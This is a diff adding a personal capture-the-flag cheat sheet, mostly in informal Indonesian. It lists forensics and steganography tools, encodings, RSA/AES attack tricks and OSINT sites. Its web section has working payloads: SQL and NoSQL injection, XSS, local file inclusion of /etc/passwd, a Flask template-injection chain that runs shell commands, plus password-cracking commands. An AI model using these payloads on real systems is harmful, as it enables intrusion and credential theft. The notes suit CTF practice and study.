@@ -1,0 +1,1057 @@
+Four and six
+
+
+
+file: biar tau ini jenis file apaan
+
+binwalk: dalem filenya ada yang tersembunyi apa kagak
+        binwalk -e buat ekstrak dalam2 nya
+
+foremost: recovery file yang semisalnya ilang
+
+exiftool: nyari metadata (keterangan file)
+
+pngcheck: ngecek kondisi png aman/gak
+
+xxd: liat nilai hex suatu file sesuai apa gak
+
+hexedit: kalo misalnya hexnya kgk sesuai, diedit ulang. Yang paling sering keluar ini: https://en.wikipedia.org/wiki/List_of_file_signatures
+
+chmod: access permission file, misalnya +x untuk add execute
+
+strings dan cat | grep “”: dah tau lah yha
+
+JohnTheRipper: cracking stuff
+
+untuk zip=
+./zip2john locked.zip > hash.txt
+./john -–wordlist=FILE hash.txt
+kalo berasil biasanya dikasi passwordnya
+
+
+*contoh file --wordlist=rockyou.txt
+
+untuk file shadow=
+./unshadow passwordfile shadowfile > hash.txt
+./john hash.txt
+
+volatility=file memorydump,gunakan :
+volatility -f memdump.raw imageinfo
+
+gunakan profile yang dianjurkan, lakukan :
+volatility --profile=suggested_profile -f FILE.raw consoles
+liat clipboard (apa yang dicopas): volatility --profile=suggested_profile -f FILE.raw clipboard
+
+liat command  : volatility --profile=suggested_profile -f FILE.raw cmdscan
+liat download history:  volatility --profile=suggested_profile -f FILE.raw iehistory
+filescan & grep: volatility --profile=suggested_profile -f FILE.raw filescan | grep flag
+
+stlh scan, ambil addressnya lalu dump: volatility --profile=suggested_profile -f FILE.raw dumpfiles -Q 0xaa873a6567c0 -D output (0xaa mksdnya address filenya dari filescan sebelumnya)
+
+volatility3
+imageinfo= ./vol.py -f [FILE] windows.info
+processlist = ./vol.py -f [FILE] windows.pslist.PsList
+
+
+
+
+flashing gif (imagemagick tools) 
+contoh: https://github.com/shiltemann/CTF-writeups-public/blob/master/IceCTF-2018/writeup.md#forensics-150-modern-picasso
+convert picasso.gif -transparent white picasso_transparent.gif
+
+
+e2fsck: repair file yang corrupt seperti .img, dan sebagainya
+thumbcache(db file):
+https://thumbcacheviewer.github.io/ untuk windows
+
+.DS_Store file: open with 
+https://github.com/gehaxelt/Python-dsstore
+
+MUTOOL(MuPDF)=convert pdf binary part → ascii
+https://www.mupdf.com/
+
+MONTAGE=nyatuin poto2
+montage -mode concatenate -title flag $(ls -v *) flag.jpg
+
+qemu(QCOW)=
+qemu-nbd --connect=/dev/nbd0 system.img
+
+FTKIMAGER  = powerful untuk forensic tingkat atas
+
+Olevba = see macro in file
+
+repair broken QR code = QRazyBox https://h3110w0r1d.com/qrazybox/
+wireshark 
+contoh command untuk mengekstrak nilai hex 
+```tshark -r older_trick.pcap -Y "ip.dst == 192.168.1.8" -T fields -e data.data > flag2.txt```
+
+-r untyk specify file
+-Y untuk specify display filter
+
+cara cepet nyari string, ketik “[PROTOCOLNAME] contains [SEARCHSTRING]” di display filter
+
+mensave gambar/gif dengan cara klik imagenya, lalu tab file > export subject > HTTP
+
+mau ngedump hasil streaming, gunakan rtmpdump atau extract video menggunakan https://github.com/quo/rtmp2flv
+
+(maybe i will need this someday) WIRESHARK MOUSE PATTERN https://medium.com/@forwardsecrecy/hackmethod-july-2017-challenges-write-up-1303f414c8d6
+firepwd.py = decrypt stored firefox password
+
+
+https://www.csvplot.com/ = untuk melihat pesan di csv yang isinya angka2
+
+dumpisf = ambil isf file dengan ./dumpisf
+```./dumpifs ~/Downloads/DawgCTF.ifs -d dawg/ -x -b```, cari etc/shadow
+
+*docx biasanya isinya zip, kalo mau cepet rename jadi blabla.zip
+*untuk problem 2 gambar serupa, coba checksum, kalau beda coba bandingkan hex
+
+UHArc file (.UHA) = gunakan tools UHARC windows ./UHARC.EXE e -pw[PasswordHere] FileName
+
+
+metasploit payload di wireshark = ambil payloadnya, save ke binary, gunakan scdbg.exe -f [FILENAME]
+(http://sandsprite.com/blogs/index.php?uid=7&pid=152, win32 Binaries)
+john the ripper & hashcat ::>>>>
+
+./john --mask=?1?1?1?1?1?1?1 -1=[0-9] HASHFILE
+→artinya: tebak pass terdiri dari 7 karakter, tiap karakter adalah angka 0-9
+hashfile:hashrahasia (liat di jtr run)
+passcracked:0831787
+
+https://countuponsecurity.files.wordpress.com/2016/09/jtr-cheat-sheet.pdf
+
+
+
+
+hashcat -m 0 -a 3 -2 ?l HASHFILE kucing?2?2?2?2?2
+→artinya: tebak hasil hash MD5(-m 0) dengan bruteforce (-a 3) dengan mask 2 adalah alfabet lower (-2 ?l) 10 karakter dan 5 huruf pertama adalah kucing.
+
+Hashfile:42a1761858fe90996de5345922c176d7
+Passcracked:kucingsakit
+
+
+check certificate from public key:
+openssl pkey -outform der -pubin -in transparency_afff0345c6f99bf80eab5895458d8eab.pem | sha256sum
+->cari nilai hashnya di censys.io
+
+rsa mantul
+untuk mencari factor langsung dari factordb
+lynx --dump http://www.factordb.com/index.php?query=267655291201323217581766648921840701061 | head | tail -n 2
+
+buka public key dan dapatkan n&e (hex modulus disatukan dan dijadikan dec)
+openssl rsa -in keyexp.pub -text -inform PEM -pubin
+
+generate private key
+rsatool.py -p 14673311234908966559 -q 18240960538242393179 -o 1.key
+
+buka private key
+openssl rsa -in key.pem -text -noout
+
+ubah der ke pem:
+openssl x509 -inform der -in 2048b-rsa-example-cert_3220bd92e30015fe4fbeb84a755e7ca5.der -pubkey -noout > certificate_publickey.pem
+
+retrieve pubkey from privkey:
+ssh-keygen -y -f /path/to/your_private_key_file (eg. /root/.ssh/id_rsa or ~/.ssh/custom_key_name)
+
+
+
+
+
+
+
+
+
+
+
+stegosaurus
+
+stegsolve=tools buat liat gambar dari berbagai macam plane bit
+
+piet(esolang)=kotak banyak warna abstrak
+decoding: https://www.bertnase.de/npiet/npiet-execute.php
+
+stegsnow=tools buat whitespace stegano
+usage=stegsnow -C -p “kalo_ada_passwordnya” challenge.txt
+--
+file=dictionary.txt (misalnya rockyou.txt)
+while read -r word
+do
+        printf "\n$word "
+        stegsnow -C -Q -p "$word" challenge.txt
+done < $file
+untuk brute force pake rockyou.txt
+*bikin di nano, jadiin brute.sh
+--
+
+contoh lain jika tipe whitespace: coba ctrl+a dan lihat apakah ada “.” dan “tab” atau simbol berpola 2 elemen lain, jika ada maka diubah jadi 1 dan 0 atau sebaliknya.
+
+steghide=extract hidden data, ada yang pakai pass
+usage:steghide extract -sf filein.jpg (trs ditanya passphrase)
+https://futureboy.us/stegano/decinput.html memakai tools ini
+
+stegcracker = extract sebuah file berdasarkan wordlist
+
+zsteg=hidden data di image (banyakan png)
+
+lsbsteg= least significant byte, udh si pake  aja toolsnya
+
+jsteg=tools stegano buat jpeg
+usage:    jsteg reveal file.jpg
+
+PCRT=png check&repair tool, biar cepet ae
+usage: python PCRT.py -v -i filein.png -o fileout.png
+
+wavsteg=stegano file .wav berdasarkan lsb dan byte
+usage: python wav-steg.py -r -s FILEIN.wav -o data_steg.txt -n 2 -b 10
+
+-n = jumlah lsb yg digunakan
+-b = jumlah byte yang direcover
+
+pencetan telepon (DTMF)= pake http://dialabc.com/sound/detect/
+https://unframework.github.io/dtmf-detect/
+twitter secret message=tulisan meliuk2
+exp:
+Tuｒｎs out the sｔｅganｏgrａｐhⅰc tｅcｈｎｉｑuｅ ｗe wｅｒｅ ｕsiｎg dⅰｄｎ'ｔ rｅalｌy mａｋe mｕcｈ ｓense.．. ｂｕｔ we ｋｅpｔ it aｎyｗａy． Oh well!
+
+Isi:
+flag_i_am_so_sorry_steg_sucks
+
+gunakan https://twsteg.devsec.fr/
+Pixel value differencing(PVD)= ada embedlog.log, gunakan pvdextract dari https://github.com/TonyJosi97/PVD-Steganography
+python3 pvdExtract.py filein.png fileout
+
+Magic Eye/stereogram: gambar berbentuk kotak2 buram tidak jelas, 
+
+gunakan ini:
+https://magiceye.ecksdee.co.uk/
+
+flag terdapat pada gambar yang dimensinya lebih besar dari gambar yang diberikan, salah satu cara gunakan png-unhide
+https://github.com/ryanking13/png-unhide
+
+mp4 randomized pixel:
+
+
+
+
+
+
+
+
+
+
+https://0x90r00t.com/2016/03/21/bctf-2016-forensics-150-catvideo-write-up/
+ffmpeg -i catvideo.mp4 -r 1/1 mycat-%04d.jpg 
+
+XORED FILE = gunakan code decrypt dengan key dari hacklabs 4.0, angka yang % diganti jumlah karakter dari key. cari key dari file signature
+
+
+
+
+
+jabcode
+
+
+zero width space = 
+https://330k.github.io/misc_tools/unicode_steganography.html
+
+
+
+cryptonite
+http://icyberchef.com/
+
+base-encoded: (gunakan basecrack.py supaya ez)
+base32: GI3DONZWGQZDGMRVGEYDKOBVHE2DMMJYG4ZDANBTGA4TIMBRGEYTGMBZGM4TSMBYGI2TMMBQGU4DINJXGQ2TKNBQGA3TKNZSG43DMOBTHE2DIOJYG43DQMZWHE4TMMZZGQYTSMBTHEZDANJXHE4DMMJWGMYTENJSG44TCMZUHE4DINJQGQYTMNRWGM4TAMRXGM4TQNRUGIYTCMRZGI2DINBXGA3TSMRVGI4DCNZYG44DANZUGYYDMMBTGQ3DAOBXG4ZDGNJVHEYDSNBRHA2TKMJWGY4TOOJUGQ3T
+
+base85:
+GB7kTHaRdkH#IRfHZ?RjH8(afGc-0eG&eLbI5IRiHaIplG&VOmGcz+eFf=(ZF)=hYH8D9dH83?ZH#9gnI59LaIW{seGc-9iGBP(YGB7YWIWaafIWspgHa0jnG%z_gIXE~mH90gjIW#yoIXE;iGdDRkI5jspH#jvjIWaRcGc_<ZGdVahH8?jmGB!0bH!?FfG&eUmF*!CdH#9UjHZ?FeFflhaFfceWGcz<bI5RggH!?
+
+base64:
+dGhpcyBpcyB0aGUgYmFzZTY0Cg==
+
+base65536:
+ꍦ鱡映㸺ꅙ饯𒀠啤啳𓁬𐙵𓅰魴餠𒁪𖥧𔐠遯𓁪𖥴顲啹𓁪𓁴𒀠啤𒅵啩灧鵳𖠠楪扴詽鸭餫𓉩怴㸊ꍦ鱡朠㸺攳攳昳昳攳昳攳攳攲攳昳昳昳攳攳昳攳攲攳攳昳昳攳攳昳昳攲攳昳攳昳昳昳昳昳攲攳攳昳昳攳昳攳攳攲攳昳昳昳攳昳昳昳攲攳攳昳昳攳攳昳昳攲攳昳昳昳攳攳昳昳攲攳攳昳昳攳攳攳攳攲攳昳昳攳昳昳攳昳攲攳攳昳昳攳攳昳昳攲攳昳攳昳昳昳昳昳攲攳昳昳昳攳昳昳昳攲攳昳昳攳昳攳攳昳攲攳攳昳昳攳昳昳昳攲攳昳昳攳昳攳攳攳㸊ꍦ鱡栠㸺襍𖡅襍𖡅襍𖡅襍𔕁襍𔕁祍𔕅襍𖡁祍𖡅襍𖡁祍𖡅襍𖡅襍𔕅襍𖡁襍𖡅襍𖡅襍𖡅祍𖡅祍𖡅祍𖡅祍𖡅祍𔕁祍𖡁襍𖡁祍𖡁祍𖡁祍𖡁祍𔕁祍𔕁祍𔕁祍𔕁祍𔕁祍𔕁襍𖡁祍𖡁襍𔕁祍𔕁祍𔕁祍𔕁祍𔕁祍𔕁祍𔕁祍𔕁祍𔕁祍𔕁祍𔕁祍𔕁祍𔕁祍𔕁祍𔕁祍𔕁祍𔕁祍𔕁祍𔕁襍𖡁祍𔕁祍𔕁祍𔕁祍𔕁襍𖡁祍𔕁襍𖡁祍𖡁祍𔕁襍𖡁祍𖡁襍𖡅襍𖡅
+base52:
+aDutCu4gwUtnqdVuhLUL6jFueSgRFi
+
+base68:
+wJNVU1tljMDBTVKm5HekQ8xx
+
+base58:
+GbDaDQz5BVRQg6xn6n1VEULC6jtXbdDmcZd2T1khCWS2mn7wFFun
+
+hexadecimal:
+746869732069732068657861646563696D616C
+
+decimal:
+116 104 105 115 32 105 115 32 100 101 99 105 109 97 108
+
+octal:
+151 156 151 157 143 164 141 154
+
+rot13:
+guvf vf ebg13
+
+rot47:
+E9:D :D C@Ecf
+
+vigenerecipher:
+dlgc mq fmeorcbi astfov
+
+caesarcipher:
+wklv lv fdhvdu flskhu
+
+baconcipher:
+BAABAAABBBABAAABAAABABAAABAAABAAAABAAAAAAAABAABBABABBAAAAABAABAAAABBBAAABBBAABAABAAAA
+
+morse:
+.- -.-- .- --  --. --- .-. . -. --.
+
+binary:
+0111010001101000011010010111001100100000011010010111001100100000011000100110100101101110011000010111001001111001
+
+fernet: sebuah cipher yang hanya bisa didecode menggunakan key tertentu
+gAAAAABe5zDHy1Vk74P8AspzQ4bqK9dzfI52djZeMbsXRk8G5ng1BtYmDj7v6SCbx7cvnUFu2fDh6XTVtQPQqlJcVVCxGoA0P4L_gtSIGHQPLZysxuoN1E7kP_5lZFbZLo6b6G-YqFxs
+
+*untuk key: iQZijGdoX0hepv2wnFZOUsTWU-v6xyGWyqSan_p75CE=
+
+brainfucek
+
++++++ +++[- >++++ ++++< ]>++. -.<++ +[->+ ++<]> +++.< +++[- >---< ]>--.<+++[ ->+++ <]>++ ++..- ----- ---.+ +++++ +++.+ +++++ +++.< +++++ [->+++++<] >++++ +++++ +.<++ ++[-> ----< ]>--- .<+++ ++++[ ->--- ----< ]>-------. <++++ ++++[ ->+++ +++++ <]>++ +++++ .<+++ +[->- 
+
+je-esfucek
+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(!
+
+malbolge code
+('&%:9]!~}|z2Vxwv-,POqponl$Hjig%eB@@>}=<M:9wv6WsU2T|nm-,jcL(I&%$#"
+`CB]V?Tx<uVtT`Rpo3NlF.Jh++FdbCBA@?]!~|4XzyTT43Qsqq(Lnmkj"Fhg${z@>
+
+
+RSA
+https://www.devglan.com/online-tools/rsa-encryption-decryption : jika enc dan public/private key
+contoh dengan RsaCtfTool:
+./RsaCtfTool.py -n 77627938360345301510724699969247652387657633828943576274039402978346703944383 -e 65537 --uncipher 62899945974090753231979111677615029855602721049941681356856158761811378918268
+contoh dengan public-private key:
+enc= openssl rsautl -encrypt -in TEXTFILE -out TEXTFILE.encrypt -pubin -inkey PUBLIC.PEM 
+dec= openssl rsautl -decrypt -in ENCRYPTEDFILE -out OUTFILE -inkey PRIVATE.PEM
+
+
+vimencryption
+python3 vimdecrypt.py --dictionary WORDLISTFILE ENCRYPTEDFILE
+
+bahasa alien (gravity falls)
+    
+
+
+
+
+
+
+
+scytale cipher
+id2pNYh 303 EuL (dengan 4 chars per lap)
+
+baudot code = mirip binary tp bukan
+01001 01110 11000 01001 00001 00100 11001 00011 00111 01001 11000 10000
+
+railfence cipher = zig zag dengan key dan offset
+Fl33TR1_c_hrC{4fncp}r31
+key=4
+offset=4
+
+ook esolang
+....................!?.?...?.......?...............?....................?.?.?.?.!!?!.?.?.?!!!!!!!..?!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!.?.......!..?!!!!!.................…
+
+pikalang
+pi pi pi pi pi pi pi pi pi pi pika pipi pi pipi pi pi pi pipi pi pi pi pi pi pi pi pipi pi pi pi pi pi pi pi pi pi pi pichu pichu pichu pichu ka chu pipi pipi 
+
+deadfish
+iisiiiisiiioiiiiiiiiiiiiiiiiioddddddddddddddoiiiiiiiiiiiioiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiioddddddddodddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
+
+spammimic https://www.spammimic.com/decode.cgi
+Dear Friend , This mail is being sent in compliance with Senate bill 2416 ; Title 5 , Section 301 ….
+fake spreadsheet=
+Expenses
+Meals,$3.83
+Office Supplies,$2.96
+fake pgp=
+-----BEGIN PGP MESSAGE-----
+Charset: ISO-8859-1
+fake russian
+коәок ӵогеnӵ
+in space
+ayam goreng           
+                 
+                 
+uuencode
+:0U1&4GMU;F0T;F=?=6YD-&YG7S-N8S!D,WT` ` 
+
+base91
+A5Rz&{8Yh2@r;mkm]wuJu=}SUJR;uF
+
+bf encoding
+lkeI8Z0OFkG76LPp8D/H0Hlm3NgPo1JB40NqmFdqJrW2J/DVS3eIuA==
+
+
+
+hexahue = kotal bergambar
+
+
+
+
+diffie-helman = g (generator), a (A’s Secret), b (B’s Secret), p (prime modulus), 
+APublic = pow(g, a, p), BPublic = pow(g, b, p), 
+s (Both secret) = pow(Bpublic, a,p) = pow(Apublic, b, p) 
+
+find smallest amount of steps changing
+# pip install python-Levenshtein
+import Levenshtein as L
+L.distance('massivegargantuanhugeepicginormous', 'tinysmallmicroscopicinvisible')
+
+RSA Cheatsheet
+large e = wiener attack (disebabkan karena nilai private key (d) terlalu kecil dan biasanya nilai Exponent (e) terlalu besar maka nilai prima p dan q bisa di dapat tanpa memfaktorkan Modulus (N)) https://github.com/pablocelayes/rsa-wiener-attack
+small e  = https://github.com/Dvd848/CTFs/blob/master/2018_picoCTF/Safe%20RSA.md
+mencari faktor prima berdekatan (misal p dan q) (if the gap between p and q is below the square root of p.) = fermat factorization 
+https://petircysec.com/s-h-e-l-l-ctf-2021-powerrsa/,  https://github.com/itsecgary/CTFs/tree/master/redpwnCTF%202020/primimity
+
+multiprime factor = cari dengan alpertron, lalu ikuti WU findit rsa book, ref:https://gist.github.com/jackz314/09cf253d3451f169c2dbb6bbfed73782
+multiple n & c (same e & plain) = hastad attack + chinese remainder theorem https://en.wikipedia.org/wiki/RSA_(cryptosystem)#Attacks_against_plain_RSA. exp: abctf 2016 a small broadcast
+multiple e& c (same n & plain) = common modulus https://github.com/PequalsNP-team/pequalsnp-team.github.io/blob/master/assets/CodeBlue2017/common_modulus.py
+n & e similar size, d large =  boneh-durfee attack https://github.com/pcw109550/write-up/tree/master/2019/ISITDTU/Easy_RSA_1
+e = 2 or e = 1= rabin cryptosystem
+RSA pow((Message + Pad), e, N) =  franklin reiter related message
+prime hasil 2^n - 1 = marin mersenne primes
+p = K*M + (65537^a % M) = ROCA(return of coppersmith attack), use neca (https://gitlab.com/jix/neca) 
+restricted signing specific plaintext  = blinding attack
+M' = M*pow(r, e, n)
+S' = pow(M', d, n)
+S = (S' * pow(r, -1, n)) % n
+
+M = plaintext
+S = signature of plaintext
+r = random number < M
+(cryptohack blinding light)
+e and n coprime (gcd(e, n) = 1) = extended eucledian algorithm (sage: d,u,v = xgcd(e,n)) https://github.com/Pynard/writeups/blob/main/2021/RARCTF/challenges/srsa.md
+
+
+
+def attack(n, e, pad1, pad2, ct1, ct2): #compfest13 final freshly random
+    R.<X> = PolynomialRing(Zmod(n))
+    p1 = (X + pad1) ^ e - ct1
+    p2 = (X + pad2) ^ e - ct2
+    return -gcd(p1, p2).coefficients()[0]
+
+
+https://en.wikipedia.org/wiki/Sexy_prime
+still unknown~~ Quadratic Sieve, General Number Field Sieve, 
+
+
+AES tricks:
+cbc  = 
+plainblock1 = plainblock1 ^ iv
+enc1 = encryptwithkey(plainblock1)
+
+plainblock2 = plainblock2 ^ enc1
+enc2 = encryptwithkey(plainblock2)
+
+decrypting(msg, key, iv) means decrypt(msg, key) ^ iv
+
+…
+
+decrypt known decrypted block with iv \x00\x00, xor with plain, get previous decrypted block, and eventually iv. (435! in tmuctf 2021) (need key)
+different iv enc-dec (compfest13) = 
+enc = encrypt(msg, KEY) ^ IV1
+msg = (decrypt(msg, KEY) ^ IV2) ^ IV2 ^ IV1
+
+byte flipping= change the decrypted plaintext by changing bytes in cipherblock N-1 (cryptohack cookie flipping) = 
+iv= iv[:6] + long_to_bytes(iv[6] ^ ord('F') ^ ord('T')) + iv[6+1:]
+iv= iv[:7] + long_to_bytes(iv[7] ^ ord('a') ^ ord('r')) + iv[7+1:]
+iv= iv[:8] + long_to_bytes(iv[8] ^ ord('l') ^ ord('u')) + iv[8+1:]
+iv= iv[:9] + long_to_bytes(iv[9] ^ ord('s') ^ ord('e')) + iv[9+1:]
+iv= iv[:10] + long_to_bytes(iv[10] ^ ord('e') ^ ord(';')) + iv[10+1:]
+
+ofb = 
+Plaintext 1 (not block) ^ Ciphertext 1 = encryptor (hasil dari enc(key, iv))
+Ciphertext 2 ^ encryptor = Plaintext 2
+*dengan catatan panjang ciphertext 1 dan ciphertext 2 sama
+
+aes.gcm = the forbidden attack or goodhash PBCTF2021
+
+zerologon:we provide null iv (b’\x00’*16) somehow the decrypted will be (\x00*16) too
+
+ctr = cyber apocalypse phasestream 4
+
+
+
+
+
+
+
+
+
+
+
+
+
+C1= P1 XOR K
+C2= P2 XOR K
+
+C1 XOR C2= (P1 XOR K) XOR (P2 XOR K)= P1 XOR P2
+
+*kalau setidaknya kita tau 16 byte plaintext, 16byte plaintext ^ 16byte ciphertext = 16 byte key. lalu semua ciphertext ^ repetitive key
+
+lot of ciphertext, no plaintext, same key: (frequency analysis) https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py
+
+
+double DES / double AES = ketika sebuah flag dienkripsi ECB 2 kali dengan 2 key yg berbeda. caranya bikin array hasil encrypt plainSample dengan key bruteforce. setelah itu bikin array hasil decrypt cipherSample dengan key bruteforce. dari kedua array tersebut cari elemen yang sama, lalu dapatkan kedua key. (cyber santa Meet Me Halfway)
+
+
+lcg = find the state(hasil random) terlebih dahulu, lalu cari state encryptor flagnya dengan gen.prev() atau gen.next()
+
+DES tricks:
+weak key (hacktoday e(z)ncryption) https://en.wikipedia.org/wiki/Weak_key
+
+0x011F011F010E010E and 0x1F011F010E010E01
+0x01E001E001F101F1 and 0xE001E001F101F101
+0x01FE01FE01FE01FE and 0xFE01FE01FE01FE01
+0x1FE01FE00EF10EF1 and 0xE01FE01FF10EF10E
+0x1FFE1FFE0EFE0EFE and 0xFE1FFE1FFE0EFE0E
+0xE0FEE0FEF1FEF1FE and 0xFEE0FEE0FEF1FEF1
+encrypt(K1, Plain) = Cipher
+encrypt(K2, CIpher) = Plain
+(triple DES cryptohack)
+
+jika codingan kyk gini:
+def rand():
+randbits = [getrandbits(32) << 32 * i for i in reversed(range(0, 6))]
+    return randbits[0] | randbits[1] | randbits[2] | randbits[3] | randbits[4] | randbits[5]
+
+solusi:
+num = ...
+res = []
+res.append(num >> 160)
+for i in range(4, 0, -1):
+    res.append((num>>(32*i)) & 0xFFFFFFFF)
+    res.append(num & 0xFFFFFFFF)
+
+
+
+
+
+jewete
+3 bagian: header (JWT, alg), body (username, isadmin), signature (encrypted header+body with key)
+tes jika algo nya bisa none, gausa verify pake key.
+
+jika terdapat public key, coba bikin jwt payload sendiri dengan private key public key tersebut, karena rentan thdp jwt confusion. (pas verify dgn public key dia pikir symmetric, sehingga terverify. 
+jika public tidak diberikan tapi yakin jwt confusion, bisa dicari dengan 2 jwt token (lihat rsa or hmac 2 cryptohack)
+
+
+
+
+HAISHHH
+bikin 2 identical file yang masing-masing mengandung sebuah [TEXT] di awal, gunakan fastcall (https://github.com/brimstone/fastcoll)
+docker run --rm -it -v $PWD:/work -w /work -u $UID:$GID brimstone/fastcoll --prefixfile input -o msg1.bin msg2.bin
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+asint
+https://osintframework.com/
+
+finding account from webs:
+python3 web_account_list_checker.py -u USERNAME
+
+history pada sebuah website:
+https://web.archive.org/
+contoh:
+https://web.archive.org/web/20200723112257/https://twitter.com/und3rm4t3r/
+
+
+lokasi berdasarkan BSSID (contoh:9C:EF:D5:FB:9F:F0)
+https://www.wigle.net/
+
+internet of things (IOT):
+Insecam.org = live cam stream
+Openstreetcam.org = street camera
+Shodan.io = charting
+
+dirb/dirbuster.dirsearch= membruteforce kemungkinan directory yang ada pada sebuah web
+dirb http://128.199.77.174:20200/
+
+dig tools = melakukan dns lookup query
+
+gravatar email check:
+https://en.gravatar.com/site/check/
+json profile data:
+https://gravatar.com/TAROEMAILHASHDISINI.json
+
+
+twirled image:
+bisa pake photoshop ato https://www.photopea.com/ , filter distort>twirl
+
+
+
+
+
+
+
+
+
+
+mac address, oui lookup
+E2:E5:83:F1:9D:6F
+Weebs
+
+robots.txt
+file webmasters create to instruct web robots
+http://www.example.com/robots.txt
+
+SQL injection
+
+{txtUserId = getRequestString("UserId");
+txtSQL = "SELECT * FROM Users WHERE UserId = " + txtUserId;}
+
+‘ OR 1=1-- -
+atau
+admin’-- -
+
+
+nosql injection
+http://10-10-116-216.p.thmlabs.com/search?username[$ne]=asu&role[$ne]=kodok
+(tampilkan username yang bukan (ne=not equal) asu dan role yang bukan kodok)
+
+xss injection
+ketika memasukkan input, lalu di address bar tertulis
+<script>alert(‘hi’)</script>
+
+local file inclusion
+/script.php?page=../../../../../../etc/passwd
+
+php filter wrapper to read PHP code
+http://example.thm.labs/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd
+
+
+
+
+
+curl=
+-A untuk user agent:
+curl -A [USERAGENT] [LINK]
+
+-e untuk referer:
+curl -e [REFERERLINK]
+
+git dumping
+gunakan tools dari https://github.com/internetwache/GitTools.git 
+./gitdumper.sh [URL YANG DITUJU].git/ out
+lalu kita baca menggunakan tig
+
+well known resource identifiers (hacktivitycon)
+https://tools.ietf.org/html/rfc5785
+
+nostromo 1.9.6- :Directory Transversal vuln
+INIBAGIANURL// “.%0d./.%0d./”   ← tambahkan ini
+maka akan terbuka index of=. . .
+
+sqlmap: membuka kemungkinan sql injection
+sqlmap -u web.cybersidn.com/ctf/5/admin/lupa.php --data POSTPARAMANDA* -a
+
+*cth: “usr=ASA&clue=Get+clue”
+
+echo “$(<flag.txt)” waktu di nahamconCTF, masuk sebagai terminal komputer lain dan gak ada cat file, gunakan ini.
+split -b 1 flag.txt split_ untuk memecah sebuah file per karakter, lalu sha256sum split_* untuk melihat nilai hash tiap file, lalu dicrack tiap hashnya.
+cat -A FILE untuk melihat hidden text
+chmod 600 FILE untuk mengubah permission file jadi readable dan writable oleh user
+ssh -i id_rsa user@jh2i.com -p 50004, connect dengan private key
+
+nc LINK -o OUTPUT untuk mendump output menjadi hex 
+contoh: nc jh21.com 50003 -o traffic_output.out
+
+check hash value: sha1sum FILE
+ 
+webhook: ketika ada sebuah link url yang disematkan sehingga dapat diteruskan ke aplikasi lain. Entahlah sya juga tidak begitu mengerti tapi intinya gitu paham lah ya ggwp.
+
+Flask Server side template injection
+{{ ''.__class__.__mro__ }} = checking for access
+{{ ''.__class__.__mro__[1].__subclasses__() }} = find all the subclasses, yg menarik cari subprocess.popen
+{{ ''.__class__.__mro__[1].__subclasses__()[xxx] }} = checking xxx-th index
+
+{{ ''.__class__.__mro__[1].__subclasses__()[xxx]('pwd',shell=True).communicate() }} 
+or
+{{ ''.__class__.__mro__[1].__subclasses__()[xxx]('pwd',shell=True,stdout=-1).communicate() }}
+=checking for shell command
+
+{{ ''.__class__.__mro__[1].__subclasses__()[xxx]('ls',shell=True,stdout=-1).communicate() }} = ls
+result: (b'app\nflag\nserver.py\nxinet_startup.sh\n', None)
+
+{{ ''.__class__.__mro__[1].__subclasses__()[xxx]('cat flag',shell=True,stdout=-1).communicate() }}=
+result: (b'picoCTF{R_C_E_wont_let_me_be_85e92c3a}', None)
+
+https://github.com/shiltemann/CTF-writeups-public/blob/master/PicoCTF_2018/writeup.md
+--flaskcard and freedom--
+
+gunakan Burpsuite:
+setup:
+download foxyproxy, add burp 127.0.0.1 port 8080
+buka http burp, download ca certificate
+settings firefox certi: import cacert
+intercept on, buka web, jgn lupa forward
+
+cek req&resp, klik kanan send to cert, ubah2
+ 
+
+
+WEEBS- PHP VULNERABILITY
+User-Agentt RCE PHP - baca cve 2021 zerodium
+PHP Collisions (type juggling) : baca WU csictf Warm Up
+
+1. mengganti user agent
+-A untuk user agent:
+curl -A [USERAGENT] [LINK] atau
+
+
+
+
+
+
+
+
+
+
+
+2. MD5 magic hash & PHP Loose comparison
+
+
+
+
+
+
+
+
+
+
+3. php extract function
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+system yg tadinya random kita beri nilai baru lewat inputan yaitu 1337, dan untuk query gacha juga kita beri nilai yang sama sehingga comparisonnya bernilai true.
+4. strcmp PHP bug
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+query ‘password’ yang kita masukkan berbentuk array, sehingga terjadi bug dan berasil masuk.
+
+5. bypass 403 forbidden rule
+
+
+
+
+
+
+
+
+
+6. modified cookie
+
+
+
+
+bisa pakai cookie editor untuk cookie ‘admin’ yang tadinya false diubah jadi true.
+
+
+7. PHP serialization
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+8. response header
+
+
+
+
+
+
+
+cek bagian header di tab network
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+9. PHP exponential
+
+
+
+
+
+
+
+
+
+
+
+
+
+1E5 akan terbaca sebagai 100000
+
+10. bypass replacement filter
+
+
+
+
+
+
+
+ketika php menghilangkan semua inputan yang bertuliskan ‘flag’ dan ‘txt’, maka bisa diakali dengan “memasukkan” flag ke dalam tulisan flag lainnya sehingga ketika flag yg di dalam terhapus, yg di luar akan tergabung dan terbaca sebagai query yg sah. Filter ini biasanya ada karena perintah preg_replace.
+
+Send Get with parameter
+curl -X GET "http://web.cybersidn.com/ctf/6/?admin=admin&pass=123"
+
+
+strcomparison     = username=admin&password[]=asgfa
